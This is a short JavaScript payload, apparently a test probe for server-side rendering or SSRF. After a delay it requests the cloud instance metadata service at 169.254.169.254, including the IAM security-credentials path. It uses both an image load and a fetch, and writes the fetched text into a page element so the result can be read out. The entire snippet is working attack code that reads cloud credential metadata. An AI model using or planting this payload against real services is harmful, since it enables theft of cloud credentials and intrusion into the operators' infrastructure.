setTimeout(function(){
  document.getElementById('r5').textContent='DELAYED_EXEC';
  var i=new Image();
  i.src='http://169.254.169.254/latest/meta-data/iam/security-credentials/';
  i.onerror=function(){document.getElementById('r5').textContent+='|IMG_ERR';};
  i.onload=function(){document.getElementById('r5').textContent+='|IMG_OK';};
  fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(t=>{
    document.getElementById('r5').textContent+='|FETCH:'+t.substring(0,200);
  }).catch(e=>{
    document.getElementById('r5').textContent+='|FETCHERR:'+e.message;
  });
},100);
